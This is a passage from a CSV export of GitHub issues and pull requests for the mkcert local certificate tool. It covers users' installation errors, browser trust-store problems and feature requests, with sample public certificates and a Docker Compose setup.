It creates profile under $HOME/.mozilla/firefox-trunk.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/353/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/353/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/353/events,https://github.com/FiloSottile/mkcert/pull/353,https://api.github.com/repos/FiloSottile/mkcert/pulls/353
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/352,827317183,MDU6SXNzdWU4MjczMTcxODM=,352,Notify if JAVA_HOME is not set,40993453,open,FALSE,NA,NA,0,2021-03-10T08:08:36Z,2021-03-21T05:52:00Z,NA,NONE,NA,"If $JAVA_HOME is not set, mkcert will (understandably) not add to Java's trust store.

It would be helpful to show a message indicating that this is the reason that it has not done so. (Especially so if $TRUST_STORES is set and includes `java` - and of course this message could be skipped if Java is not installed.)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/352/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/352/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/352/events,https://github.com/FiloSottile/mkcert/issues/352,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/350,825744583,MDU6SXNzdWU4MjU3NDQ1ODM=,350,[Question] mkcert vs cert-manager,1273014,open,FALSE,NA,NA,3,2021-03-09T11:08:48Z,2021-04-15T05:10:05Z,NA,NONE,NA,Are these two providing the same functionality in terms of cert management?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/350/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/350/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/350/events,https://github.com/FiloSottile/mkcert/issues/350,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/349,824011681,MDU6SXNzdWU4MjQwMTE2ODE=,349,[Question] mkcert vs Lets Encrypt,1273014,open,FALSE,NA,NA,1,2021-03-07T20:32:09Z,2021-03-07T20:38:08Z,NA,NONE,NA,"Are these two essentially providing the same type of TLS service? 

If not could someone point out the main differences.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/349/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/349/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/349/events,https://github.com/FiloSottile/mkcert/issues/349,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/348,823723075,MDU6SXNzdWU4MjM3MjMwNzU=,348,unable to use in virtualbox,48400531,open,FALSE,NA,NA,2,2021-03-06T19:03:59Z,2021-03-07T06:04:35Z,NA,NONE,NA,"I want to use mkcert generated certificates into the ubuntu virtual machine inside the VirtualBox.

I try but no success

**Chrome(on Windows 10) Error:** windows does not have enough information to verify certificates

note - I installed mkcert using choco in windows 10 and generate certificates and then import them into vm.

info ---
Host: Windows 10
guest: ubuntu 18.04 Linux virtual machine in VirtualBox.
server software: apache2",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/348/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/348/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/348/events,https://github.com/FiloSottile/mkcert/issues/348,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/347,821588699,MDU6SXNzdWU4MjE1ODg2OTk=,347,Instructions for generating certificates for MariaDB/ Postgres ,45804405,open,FALSE,NA,NA,1,2021-03-03T23:30:54Z,2021-03-12T11:17:55Z,NA,NONE,NA,"Could someone help me figure out how to generate mkcert certificates the same way that this article does with OpenSSL?

https://www.cyberciti.biz/faq/how-to-setup-mariadb-ssl-and-secure-connections-from-clients/

I've tried to use mkcert for MariaDB server/client configuration but for some reason it doesn't work. ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/347/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/347/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/347/events,https://github.com/FiloSottile/mkcert/issues/347,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/346,817967678,MDU6SXNzdWU4MTc5Njc2Nzg=,346,Installing mkcert ,36457967,open,FALSE,NA,NA,0,2021-02-27T16:45:53Z,2021-02-27T16:45:53Z,NA,NONE,NA,"Hi everyone,

I am dealing with this error while installing mkcert on Windows:

ERROR: failed to execute ""keytool -importcert"": exec: ""sudo"": executable file not found in %PATH%

Not really sure what is going on here.
 ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/346/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/346/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/346/events,https://github.com/FiloSottile/mkcert/issues/346,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/345,816668945,MDU6SXNzdWU4MTY2Njg5NDU=,345,NET::ERR_CERT_INVALID from 180#,4014938,closed,FALSE,NA,NA,1,2021-02-25T18:03:48Z,2021-02-25T18:16:34Z,2021-02-25T18:16:34Z,NONE,NA,"Issue Fixed.
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/345/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/345/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/345/events,https://github.com/FiloSottile/mkcert/issues/345,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/344,816200805,MDExOlB1bGxSZXF1ZXN0NTc5OTAyMTQy,344,"if SANs are not present in CSR, use CN",42109527,open,FALSE,NA,NA,0,2021-02-25T08:18:29Z,2021-02-25T18:28:30Z,NA,NONE,NA,issue #318,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/344/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/344/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/344/events,https://github.com/FiloSottile/mkcert/pull/344,https://api.github.com/repos/FiloSottile/mkcert/pulls/344
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/343,812945020,MDU6SXNzdWU4MTI5NDUwMjA=,343,Expiration ,720237,open,FALSE,NA,NA,2,2021-02-21T20:37:15Z,2021-02-26T11:18:56Z,NA,NONE,NA,Do it is possible to set custom expiration date?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/343/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/343/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/343/events,https://github.com/FiloSottile/mkcert/issues/343,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/342,807939557,MDU6SXNzdWU4MDc5Mzk1NTc=,342,local CA not installed on firefox/chrome,78853921,open,FALSE,NA,NA,0,2021-02-14T11:15:50Z,2021-02-14T11:16:50Z,NA,NONE,NA,"I followed the steps to install the certification in the ubuntu environment but I got this alert when I launched 'mkcert -install'

""The local CA is now installed in the system trust store! ⚡️
Installing in Firefox and/or Chrome/Chromium failed. Please report the issue with details about your environment at https://github.com/FiloSottile/mkcert/issues/new 👎
Note that if you never started Firefox and/or Chrome/Chromium, you need to do that at least once.""

knowing that I used the following version 'mkcert-v1.1.2-linux-amd64'
what was wrong please ?!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/342/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/342/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/342/events,https://github.com/FiloSottile/mkcert/issues/342,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/341,807710569,MDU6SXNzdWU4MDc3MTA1Njk=,341,Using CLI tools to request service with mkcert certs does not work (macOS),1140272,closed,FALSE,NA,NA,4,2021-02-13T09:04:46Z,2021-03-07T15:28:32Z,2021-03-07T15:28:32Z,NONE,NA,"E.g. if I make requests to my local container (Traefik + mkcert generated certs) with Httpie. Note that these certs work when accessing the site with Chrome or Firefox. I use macOS Big Sur atm.

```
$ http --headers https://portainer.docker.sh
```

Will end up with following error:

```
http: error: SSLError: HTTPSConnectionPool(host='portainer.docker.sh', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1123)'))) while doing a GET request to URL: https://portainer.docker.sh/
```

Original issue from our tool:
https://github.com/druidfi/stonehenge/issues/47

- Is there some extra step I'm missing?
- Or is this a known issue?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/341/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/341/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/341/events,https://github.com/FiloSottile/mkcert/issues/341,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/340,807634977,MDExOlB1bGxSZXF1ZXN0NTcyODUxMzU0,340,Linuxbrew -> Homebrew on Linux,41864,closed,FALSE,NA,NA,1,2021-02-13T00:42:20Z,2021-02-13T02:35:00Z,2021-02-13T02:34:52Z,CONTRIBUTOR,NA,Homebrew was formerly referred to as Linuxbrew when running on Linux or WSL.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/340/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/340/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/340/events,https://github.com/FiloSottile/mkcert/pull/340,https://api.github.com/repos/FiloSottile/mkcert/pulls/340
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/339,807545462,MDU6SXNzdWU4MDc1NDU0NjI=,339,[FR] -days,45012292,open,FALSE,NA,NA,0,2021-02-12T21:03:05Z,2021-02-12T21:04:36Z,NA,NONE,NA,"Sorry for the short presentation, got to do a lot of other stuff and make the stupid OpenVPN virtual machine working.

Due to **a lot** of controversy with days and whatnot these last times, why not add a `-days` parameter to everything (checking that the `NotAfter` of a certificate isn't due **after** the `NotAfter` of the CA) and allow the user to customize literally **everything** about the time constrains? (on a local (maybe offline) dev machine a user might even want to issue a wildcard cert maybe every 10y or so)

(also) Why there are no `-orgunit` or `-country` and such for ""personalizing"" the certificate? I know it matters the least, but my OCD claims for perfectly-organized digital management 😅",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/339/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/339/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/339/events,https://github.com/FiloSottile/mkcert/issues/339,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/338,806670681,MDU6SXNzdWU4MDY2NzA2ODE=,338,"Error Try to execute command mkcert -key-file ./.cert/key.pem -cert-file ./.cert/cert.pem ""localhost"" -  Windows",74147118,closed,FALSE,NA,NA,1,2021-02-11T19:19:41Z,2021-02-12T14:57:01Z,2021-02-12T14:55:23Z,NONE,NA,"I installed mkcert on Windows and followed the procedures as described. However, when executing the command to install the certificate and project key files, the following error occurs:

![mkcert_1](https://user-images.githubusercontent.com/74147118/107687138-dfbb2980-6c84-11eb-8b1f-3bdcc1427c3a.png)

Is there another way to do it ?
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/338/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/338/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/338/events,https://github.com/FiloSottile/mkcert/issues/338,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/337,805541137,MDU6SXNzdWU4MDU1NDExMzc=,337,minimize CA root certificate lifetime,78853921,open,FALSE,NA,NA,1,2021-02-10T14:03:43Z,2021-02-10T17:35:01Z,NA,NONE,NA,"I have a problem on safari browser with ios 13 and 14 devices. the rootCA.pem is installed and exists under trusted certificates on ios device but it still not valid on safari!!

after seeing some replies on the net , certain recommand to minimise the lifetime of the certificate to maximum 825 days. 
Is it possible with mkcert certificate ? if yes wich release contains this configuration ? ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/337/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/337/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/337/events,https://github.com/FiloSottile/mkcert/issues/337,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/336,800465049,MDU6SXNzdWU4MDA0NjUwNDk=,336,Issue with Zoom after running mkcert,15385374,closed,FALSE,NA,NA,2,2021-02-03T15:59:03Z,2021-02-03T19:03:18Z,2021-02-03T19:03:17Z,NONE,NA,"After running mkcert to install localhost certs , I am now getting this Zoom popup macOS 11.2, which continues to appear no matter what I click:
<img width=""467"" alt=""Screenshot 2021-02-03 at 09 50 36"" src=""https://user-images.githubusercontent.com/15385374/106773211-42477080-665a-11eb-994b-54a56a9889c4.png"">


Any ideas? Thanks in advance!



",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/336/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/336/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/336/events,https://github.com/FiloSottile/mkcert/issues/336,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/335,797395630,MDExOlB1bGxSZXF1ZXN0NTY0NDA1MDcw,335,add instructions for WSL2 users,1209874,open,FALSE,NA,NA,1,2021-01-30T11:23:13Z,2021-01-30T14:40:16Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/335/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/335/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/335/events,https://github.com/FiloSottile/mkcert/pull/335,https://api.github.com/repos/FiloSottile/mkcert/pulls/335
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/334,792814406,MDU6SXNzdWU3OTI4MTQ0MDY=,334,NET::ERR_CERT_AUTHORITY_INVALID on Raspbian Buster,5714127,closed,FALSE,NA,NA,4,2021-01-24T14:58:32Z,2021-01-24T19:53:05Z,2021-01-24T15:33:19Z,NONE,NA,"Been following the directions to install on Raspberry Pi 4b here: [https://kifarunix.com/how-to-create-self-signed-ssl-certificate-with-mkcert-on-ubuntu-18-04/](https://kifarunix.com/how-to-create-self-signed-ssl-certificate-with-mkcert-on-ubuntu-18-04/) (using the latest releases - tried both [mkcert-v1.4.3-linux-arm64](https://github.com/FiloSottile/mkcert/releases/download/v1.4.3/mkcert-v1.4.3-linux-arm64) wouldn't execute, but the 32-bit version executed ok: [mkcert-v1.4.3-linux-arm](https://github.com/FiloSottile/mkcert/releases/download/v1.4.3/mkcert-v1.4.3-linux-arm)
mkcert appears to be installed ok, but the CA isn't being accepted by the Chromium browser on the local machine (should this also work for other machine accessing from the LAN?). Trying to find more details directions to see if there's soemthing I've missed, but now at a loss...

Browser returns the following in Chrome (Firefox the same):
```
NET::ERR_CERT_AUTHORITY_INVALID
Subject: mkcert development certificate

Issuer: mkcert root@aardvarkyweb

Expires on: 24 Apr 2023

Current date: 24 Jan 2021

PEM encoded chain:
```

",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/334/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/334/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/334/events,https://github.com/FiloSottile/mkcert/issues/334,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/333,792049808,MDExOlB1bGxSZXF1ZXN0NTYwMDAxMDgx,333,fix: Limit cert lifetime to 397 days to align with Googles new policy.,387666,closed,FALSE,NA,NA,1,2021-01-22T14:30:42Z,2021-03-21T05:53:25Z,2021-01-22T22:17:21Z,NONE,NA,"Aims to fix #331 as proposed in the comments. Limits cert lifetime to 397 days: `.AddDate( 1, 1, 1 )` (y,m,d).",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/333/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/333/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/333/events,https://github.com/FiloSottile/mkcert/pull/333,https://api.github.com/repos/FiloSottile/mkcert/pulls/333
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/332,789936949,MDExOlB1bGxSZXF1ZXN0NTU4MjA2NTY0,332,Add `-check` flag to check if local CA is installed or not,104180,open,FALSE,NA,NA,0,2021-01-20T12:28:26Z,2021-01-20T12:28:26Z,NA,NONE,NA,"When using `mkcert` as part of an automation script you sometimes want to know if the user already installed the local CA or not.

Running `mkcert -install` out of the blue could confuse users because they don't know what's happening.

Therefore, it's better to first check if the local CA is installed with `mkcert -check`. If that returns a zero exit code, all is good. If it returns a non-zero exit code, it means that the local CA is not installed and the user can be instructed on what to do next (`mkcert -install`).

## How does it look?

```
$ mkcert -check
Note: the local CA is not installed in the system trust store.
Note: the local CA is not installed in the Firefox trust store.
Run ""mkcert -install"" for certificates to be trusted automatically ⚠️

$ echo $?
1

$ mkcert -install
The local CA is now installed in the system trust store! ⚡️
The local CA is now installed in the Firefox trust store (requires browser restart)! 🦊

$ mkcert -check
All good!

$ echo $?
0
```",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/332/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/332/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/332/events,https://github.com/FiloSottile/mkcert/pull/332,https://api.github.com/repos/FiloSottile/mkcert/pulls/332
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/331,785057786,MDU6SXNzdWU3ODUwNTc3ODY=,331,Chrome ERR_CERT_VALIDITY_TOO_LONG error,387666,open,FALSE,NA,NA,7,2021-01-13T12:20:10Z,2021-04-19T20:03:35Z,NA,NONE,NA,"Chrome refuses to access the resource with `NET::ERR_CERT_VALIDITY_TOO_LONG`.  
I can add an exception by using `--unsafely-treat-insecure-origin-as-secure` and clicking the ""Advanced"" > ""Proceed to <domain>.<tld>"" button on the warning page. Chrome still will show ""Not secure"" in the address bar.

It would be nice to have this working 100%, not just 90% :)

The cert I just generated has a validity range of exactly 10 years:

**Not valid before:** Wednesday, 13. January 2021 at 12:45:06 Central European Standard Time
**Not valid after:** Monday, 13. January 2031 at 12:45:06 Central European Standard Time

_Note: Chrome displays not only the cert, but also the rootCA in their error page._

Below you can find an example I just generated (the second cert is the `rootCA.pem` file contents):

~~_Note: I have no idea if this is a bug/ regression where I can't find a way to debug and find it's root cause, or Chrome just updated in the background and this is expected default behavior._~~

```
Your connection is not private
Attackers might be trying to steal your information from traefik.bell.test (for example, passwords, messages, or credit cards). Learn more
NET::ERR_CERT_VALIDITY_TOO_LONG
Subject: mkcert development certificate

Issuer: mkcert root@devcerts

Expires on: Jan 13, 2031

Current date: Jan 13, 2021

PEM encoded chain:
-----BEGIN CERTIFICATE-----
MIIEQDCCAqigAwIBAgIQEtGKwB/F07dtGmZ3flpA0jANBgkqhkiG9w0BAQsFADBX
MR4wHAYDVQQKExVta2NlcnQgZGV2ZWxvcG1lbnQgQ0ExFjAUBgNVBAsMDXJvb3RA
ZGV2Y2VydHMxHTAbBgNVBAMMFG1rY2VydCByb290QGRldmNlcnRzMB4XDTIxMDEx
MzExNDUwNloXDTMxMDExMzExNDUwNlowQTEnMCUGA1UEChMebWtjZXJ0IGRldmVs
b3BtZW50IGNlcnRpZmljYXRlMRYwFAYDVQQLDA1yb290QGRldmNlcnRzMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsAnLQORBXCzVQLdAy6NsvSYM7Kfx
+GWJbTvHJz+QzwbFo6yXlcjpCTLAz0a6djR/pyFbXeAzfGsPfdgneWAzFWKaVgGN
ES6mGc1ul/BhxmUVPVbSJSiZviPXCd6uWJYcXS0zUNEYhGOB+ve8YdvfYu5PNr8A
qPwqhm/n++559OXTSHFyR6SfygMal8Seulm3aw4XnXhElWT42qsj0UjGY5Mnl02h
TZeDI3NAVuvPcqbJwI02rA9cs+N/HETqxDT1sJvCW7dW2gYjd58L/Iz4XoXPipkJ
JoEHZoSJ9VwFz6S9TJc+TtDwtkFk6e2PRpdaUQVNcCMFYkADFCGjDKopowIDAQAB
o4GdMIGaMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNV
HRMBAf8EAjAAMB8GA1UdIwQYMBaAFFIiavM5rChO0XwYvbaBcqjf4EXfMEQGA1Ud
EQQ9MDuCCyouYmVsbC50ZXN0ggliZWxsLnRlc3SCCWxvY2FsaG9zdIcEfwAAAYcQ
AAAAAAAAAAAAAAAAAAAAATANBgkqhkiG9w0BAQsFAAOCAYEAPazkSSYItR239Dh8
8y02wRUSeqsOLI07susbIAWKFXd37SZF3NU4+v4NJwSX9SRGNDD1i3wwC+SaC9Rg
ty4hX4JEiUmiKeZPsD4tNgsPFPekEi/bmb5pSgbROtHTcAe3QfVuRjsKKtta5c5G
ST17LtQdajJ8Zc88pfrsxwrUnpBx3xgIlKJKQqtBvmxTGJA+11vbT9c8OfQ9PoK4
PxzhMskKRY6DWm5BkFd/x/kLdofSvDHMKa3k4zP2uiiTMgu42FforRTmo3odCK/b
40HQQ2Vyg4H5fKeO06RMDwk4rB57gWM4TB2VLwwF870y9BBPvYb5Rer+y418b20b
hfAOVtDbJWvxxKWhk1AFheFvFzUFFak4wkXPl/VBPRI+0mZVfqoiFLdQbTh5qoqz
j7Vz0t6wMzLePcpnixWQCb8x0bJIRkqIhG1VY5MFUruGFLAjmjUssgIS3NP95/Gw
IL+zhJSTFQ7sXzWdqwGjbpccClqJLGAmwvkN03eGqjlOkvgX
-----END CERTIFICATE-----
-----BEGIN CERTIFICATE-----
MIIEfjCCAuagAwIBAgIRAMM6NYCUwrVxff+UzfRfI70wDQYJKoZIhvcNAQELBQAw
VzEeMBwGA1UEChMVbWtjZXJ0IGRldmVsb3BtZW50IENBMRYwFAYDVQQLDA1yb290
QGRldmNlcnRzMR0wGwYDVQQDDBRta2NlcnQgcm9vdEBkZXZjZXJ0czAeFw0yMTAx
MTMwMDQzMjZaFw0zMTAxMTMwMDQzMjZaMFcxHjAcBgNVBAoTFW1rY2VydCBkZXZl
bG9wbWVudCBDQTEWMBQGA1UECwwNcm9vdEBkZXZjZXJ0czEdMBsGA1UEAwwUbWtj
ZXJ0IHJvb3RAZGV2Y2VydHMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB
gQDlThmign5Fwnhswp0ZYv7HFHrr8aFnDtmF+pJKcfetAlxAQwGQRaF8JLynDs+K
tZ8jQjQtEbsUVAvz4oc7r+RM4g5jncpk7lYRIyetnUs4BiOdnVcwo1vQ7Q5n64nT
QB/FXSvYjywYIKL0COft+bBtToD4fsVz1OYYON2x2jGcpyAhJ8L3p7VVRQlN4JQn
kJoVRjQKdgTygwj3AIoY8XS9Sw+BQtvS5Mbaq9QJkbt7v8eB7xt0l51mCEYMg1ee
KuBtlHAKafT5vtNpAmdk2qc+uRhUhG4SLGoqwfUyj7LCBu9pVt46WUur0Mo+m7qB
3r9aTqRqEU0qdmh5VO2j5iPGQj/pVoIEpWEJ00aL6NkJzHcJfL/VpfZKQhbVUAw4
ut3Mo/IP00rNaqYcuk/EwSnbt+azNOgdrP77kIZCqH119yxcril9I7LpftpoJkhE
Nwc0WiTQB5yObfqTgGNOrg1YoEty5Rg8OU4DG3459JFbqsRoZgMwsIiw05tUZ493
B2ECAwEAAaNFMEMwDgYDVR0PAQH/BAQDAgIEMBIGA1UdEwEB/wQIMAYBAf8CAQAw
HQYDVR0OBBYEFFIiavM5rChO0XwYvbaBcqjf4EXfMA0GCSqGSIb3DQEBCwUAA4IB
gQB/RohLFOG2UBUXfaRKTZoLL4RqbBkgmqQ18DoKHupuTBtppiPYYfunXK4e+Kze
YAx7H6wNIHw813ZzwlRkkcpW9zy/m+SrAzt+KCSUJwhCOBET5PAURplnra3KRY0y
tXE5KyQ9ixaLsE5/W1PYkSZ8VxSbwyxC+cZga+621Yx4g0bSjcGE43khfKPrNCjG
VZ1VqRQScJJ6qiFps3EbnOR9BrPoCLRqDbZEEESRGk+Gq7WEt3UVNolBEvJL8NNE
T2Zd27FXxx7dEaqO3YGmnIUfR2sQ1pFgxz8pPjWHAAigEKYFoGcxzUvVHWA7QNi8
QeTKrjxEX92s9LhcoUXie7GcuD4Zm6VSt4/2KR/4peK6fgGAasU34wEnqIc2y2qV
+0Cog7lHDjYdYC0qj2e8haYBe94STPYv9DMxbtq1XxDB0tJbqA1Aj0hABky1/RY5
eTOLw5lhpNOSe38xWUSHQUI86clHS2Es2mpyLRCKLzo2RTTWAjynS3oH5TX/QwVI
tEw=
-----END CERTIFICATE-----
```

The fingerprints are correct and matching. Here're the scripts to check.

```shell
#!/usr/bin/env bash
CERTIFICATE=${*?Certificate missing}
openssl x509 -noout -in ""${CERTIFICATE}"" -fingerprint -sha1
```

```shell
#!/usr/bin/env bash
CERTIFICATE=${*?Certificate missing}
keytool -printcert -v -file ""${CERTIFICATE}""
```

#### Setup
The whole test/ demo setup contains out of Alpine Linux containers. The containers are orchestrated using Docker Compose. All public facing containers share the same network and a named volume:

```yaml
---
# $ROOT_DOMAIN and $MKCERT_TAG are set inside `.env`
version: '3'

services:
  # Local development certificates (mkcert)
  devcerts:
    image: ""kklepper/mkcert_a:${MKCERT_TAG:-alpine}""
    hostname: ""devcerts""
    command:
      - /bin/sh
      - -c
      - ""/root/mkcert -cert-file $${CAROOT}/cert.$${CERT_FILENAME}  -key-file $${CAROOT}/key.$${CERT_FILENAME}  '*.${ROOT_DOMAIN}'  ${ROOT_DOMAIN}  localhost  127.0.0.1  ::1""
    networks:
      - certs
    ports:
      - ""2443:443""
    working_dir: /usr/local/share/ca-certificates
    volumes:
      - type: volume
        source: dev-cert-storage
        target: /usr/local/share/ca-certificates
        volume:
          nocopy: false
    environment:
      - CAROOT=/usr/local/share/ca-certificates

  other_container:
    volumes:
      # Certificates for local development.
      - dev-cert-storage:/usr/local/share/ca-certificates:ro


volumes:
  dev-cert-storage:
    driver_opts:
      type: none
      o: bind
      device: ${PWD}/certs
```

Process:
1. The container simple receives a `docker-compose up devcerts` and then creates the certs. It saves it to the named volume, which then shared.
1. Then the cert gets copied to the mkcert CA root dir: `cp ./root* ""$(mkcert -CAROOT)""`
1. After this happened, the certs get added to the keychain in macOS: `cd ./path/to/certs; mkcert -install`.

```
The local CA is now installed in the system trust store! 👍
The local CA is now installed in the Firefox trust store! 👍
The local CA is now installed in Java's trust store! 👍
```

**Provider:** Docker Compose/ Docker using [The mkcert image by kklepper](https://hub.docker.com/r/kklepper/mkcert_a/tags?page=1&ordering=last_updated). 

##### System
**`mkcert`:** 
```
$ mkcert --version
v1.4.3
```
**Host OS:** MacOS 11.1 Big Sur
**Google Chrome:** Version 87.0.4280.141 (Official Build) (x86_64)
**Firefox:** 84.0.2 (64-bit)
**Safari:** Version 14.0.2 (16610.3.7.1.9)

Might be related to:
- https://github.com/FiloSottile/mkcert/issues/313

_Note: Verbose process description, keywords, etc. are meant to offer better indexing to help others find this issue and hopefully also find some help._",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/331/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/331/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/331/events,https://github.com/FiloSottile/mkcert/issues/331,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/330,781887329,MDU6SXNzdWU3ODE4ODczMjk=,330,mkcert -install` fails to run on Arch based system,8090634,open,FALSE,NA,NA,3,2021-01-08T06:38:14Z,2021-02-15T05:32:15Z,NA,NONE,NA,"After installing the necessary package required in the installation note, I run the first command 
 ```
mkcert -install
ERROR: failed to execute ""update-ca-certificates"": exec: ""update-ca-certificates"": executable file not found in $PATH
```
It seems he is searching for update-ca-certificates command, but Arch is providing a sightly different command to do the same job `trust` I think this case should be taken into account to make the `mkcert -install` to run correctly.
Thank you
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/330/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/330/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/330/events,https://github.com/FiloSottile/mkcert/issues/330,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/329,781402480,MDU6SXNzdWU3ODE0MDI0ODA=,329,Build mkcert release for Apple Silicon,112444,open,FALSE,NA,NA,2,2021-01-07T15:36:50Z,2021-01-24T15:56:53Z,NA,NONE,NA,I note that you already have mkcert in homebrew for Apple Silicon... Could we also have it built here in releases?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/329/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/329/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/329/events,https://github.com/FiloSottile/mkcert/issues/329,NA
